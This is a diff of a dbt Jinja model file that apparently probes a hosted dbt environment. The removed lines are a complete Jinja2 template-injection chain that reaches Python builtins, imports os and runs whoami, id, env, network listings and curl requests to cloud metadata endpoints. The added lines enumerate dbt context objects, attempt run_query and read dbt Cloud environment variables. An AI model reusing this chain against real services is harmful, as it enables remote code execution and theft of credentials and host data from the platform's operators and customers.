@@ -1,50 +1,43 @@
-{# Test Python object model access - classic Jinja2 SSTI vectors #}
+{# dbt context exploration - what methods/attrs are available #}
 
-{% set x = ''.__class__ %}
-{{ log("T1_CLASS=" ~ x, info=True) }}
+{# Try adapter operations #}
+{{ log("ADAPTER=" ~ adapter if adapter is defined else 'no_adapter', info=True) }}
 
-{% set x = ''.__class__.__mro__ %}
-{{ log("T2_MRO=" ~ x, info=True) }}
+{# Try to list all available context variables #}
+{# In dbt, 'this' refers to the current model's relation #}
+{{ log("THIS=" ~ this if this is defined else 'no_this', info=True) }}
 
-{# Try to access object base class #}
-{% set x = ''.__class__.__mro__[-1] %}
-{{ log("T3_OBJECT=" ~ x, info=True) }}
+{# Try exceptions module #}
+{{ log("EXCEPTIONS=" ~ exceptions if exceptions is defined else 'no_exceptions', info=True) }}
 
-{# Try subclasses - this is the key for RCE #}
-{% set x = ''.__class__.__mro__[-1].__subclasses__() %}
-{{ log("T4_SUBCLASS_COUNT=" ~ x|length, info=True) }}
+{# Try selected_resources #}
+{{ log("SELECTED=" ~ selected_resources if selected_resources is defined else 'no_selected', info=True) }}
 
-{# Try cycler/joiner/namespace init globals #}
-{% set x = cycler(1) %}
-{{ log("T5_CYCLER=" ~ x.__class__, info=True) }}
-{{ log("T6_CYCLER_INIT=" ~ x.__class__.__init__, info=True) }}
+{# Try model context #}
+{{ log("MODEL=" ~ model if model is defined else 'no_model', info=True) }}
 
-{# Try to access builtins via globals #}
-{% set x = cycler.__init__.__globals__ %}
-{{ log("T7_GLOBALS_KEYS=" ~ x.keys()|list, info=True) }}
+{# Try execute flag - if True, we can run queries #}
+{{ log("EXECUTE=" ~ execute if execute is defined else 'no_execute', info=True) }}
 
-{# Try lipsum (Jinja2 built-in) #}
-{{ log("T8_LIPSUM=" ~ lipsum.__globals__, info=True) }}
+{# Try run_query if execute is True #}
+{% if execute %}
+{{ log("EXECUTE_IS_TRUE", info=True) }}
+{% else %}
+{{ log("EXECUTE_IS_FALSE_COMPILE_ONLY", info=True) }}
+{% endif %}
 
-{# Try config object #}
-{{ log("T9_CONFIG=" ~ config, info=True) }}
-{{ log("T10_CONFIG_CLASS=" ~ config.__class__, info=True) }}
+{# Try to use run_query during compile (will probably fail but info on error msg) #}
+{% set test_query = run_query("SELECT 1 as test") %}
+{{ log("QUERY_RESULT=" ~ test_query, info=True) }}
 
-{# Try to import os via builtins #}
-{% set builtins = cycler.__init__.__globals__['__builtins__'] %}
-{{ log("T11_BUILTINS_TYPE=" ~ builtins.__class__, info=True) }}
-{{ log("T12_BUILTINS_KEYS=" ~ builtins.keys()|list, info=True) }}
+{# Try fromjson / tojson #}
+{{ log("TOJSON_TEST=" ~ tojson({"key":"val"}), info=True) }}
 
-{# If __import__ exists, try os.popen #}
-{% set imp = cycler.__init__.__globals__['__builtins__']['__import__'] %}
-{% set os = imp('os') %}
-{{ log("T13_OS_MODULE=" ~ os, info=True) }}
-{{ log("T14_WHOAMI=" ~ os.popen('whoami').read(), info=True) }}
-{{ log("T15_ID=" ~ os.popen('id').read(), info=True) }}
-{{ log("T16_HOSTNAME=" ~ os.popen('hostname').read(), info=True) }}
-{{ log("T17_ENV=" ~ os.popen('env').read(), info=True) }}
-{{ log("T18_IFCONFIG=" ~ os.popen('ip addr 2>/dev/null || ifconfig 2>/dev/null').read(), info=True) }}
-{{ log("T19_PROCNET=" ~ os.popen('cat /proc/net/tcp 2>/dev/null').read(), info=True) }}
-{{ log("T20_METADATA=" ~ os.popen('curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null || curl -s http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google" 2>/dev/null').read(), info=True) }}
+{# Try env_var with some dbt internal prefixes #}
+{{ log("DBT_CLOUD_GIT_SHA=" ~ env_var('DBT_CLOUD_GIT_SHA', 'NOT_SET'), info=True) }}
+{{ log("DBT_CLOUD_GIT_BRANCH=" ~ env_var('DBT_CLOUD_GIT_BRANCH', 'NOT_SET'), info=True) }}
+{{ log("DBT_CLOUD_ENVIRONMENT_TYPE=" ~ env_var('DBT_CLOUD_ENVIRONMENT_TYPE', 'NOT_SET'), info=True) }}
+{{ log("DBT_CLOUD_URL=" ~ env_var('DBT_CLOUD_URL', 'NOT_SET'), info=True) }}
+{{ log("ORCHESTRATOR_PATH=" ~ env_var('ORCHESTRATOR_PATH', 'NOT_SET'), info=True) }}
 
 SELECT 1 as id
